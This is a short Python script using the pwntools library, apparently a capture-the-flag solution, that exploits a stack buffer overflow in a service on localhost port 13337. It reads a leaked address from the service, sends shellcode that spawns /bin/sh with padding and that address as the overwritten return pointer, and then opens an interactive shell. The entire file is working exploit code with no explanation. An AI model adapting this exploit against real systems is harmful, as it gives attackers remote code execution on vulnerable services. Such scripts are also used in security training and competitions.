#!/usr/bin/env python

from pwn import *

payload = asm(shellcraft.sh())

r = remote('127.0.0.1', 13337)
r.recvuntil('journey ')
addr = int(r.recvline().strip()[:-1], 16)
r.sendline(payload + ('A' * (0x12e - len(payload))) + p32(addr))
r.interactive()

